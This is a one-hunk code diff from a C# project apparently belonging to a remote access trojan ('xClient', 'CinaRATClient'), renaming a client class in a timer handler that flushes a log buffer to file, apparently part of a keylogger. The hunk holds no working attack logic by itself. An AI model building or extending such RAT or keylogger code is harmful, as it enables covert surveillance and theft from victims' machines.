@@ -237,7 +237,7 @@ namespace xClient.Core.Utilities
 
         private void timerFlush_Elapsed(object sender, System.Timers.ElapsedEventArgs e)
         {
-            if (_logFileBuffer.Length > 0 && !YggdrasilClient.Exiting)
+            if (_logFileBuffer.Length > 0 && !CinaRATClient.Exiting)
                 WriteFile();
         }
 
